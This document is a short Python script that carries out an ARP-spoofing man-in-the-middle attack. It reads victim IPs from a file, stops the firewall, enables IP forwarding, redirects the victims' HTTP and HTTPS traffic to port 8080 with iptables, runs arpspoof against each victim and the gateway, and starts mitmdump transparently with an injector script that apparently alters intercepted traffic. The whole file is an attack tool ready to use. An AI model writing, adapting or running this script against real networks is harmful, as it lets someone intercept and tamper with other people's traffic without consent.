import os
import sys

#get gateway_ip (router)
gateway = sys.argv[1]
print("gateway: " + gateway)

# get victims_ip
victims = [line.rstrip('\n') for line in open("victims.txt")]
print("victims:")
print(victims)

# configure ip forwarding and shutdown firewall
os.system("sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'")
os.system("sudo service firewalld stop");

# configure routing (IPTABLES)
os.system("sudo iptables -t nat -A POSTROUTING -o wlp2s0 -j MASQUERADE")
os.system("sudo iptables -t nat -A PREROUTING -i wlp2s0 -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
os.system("sudo iptables -t nat -A PREROUTING -i wlp2s0 -p tcp --destination-port 443 -j REDIRECT --to-port 8080")

# run the arpspoof for each victim, each one in a new console
for victim in victims:
    os.system("xterm -e sudo arpspoof -t " + victim + " " + gateway + " &")
    os.system("xterm -e sudo arpspoof -t " + gateway + " " + victim + " &")

# start the mitmproxy
os.system("sudo ./mitmdump -s injector.py -m transparent")

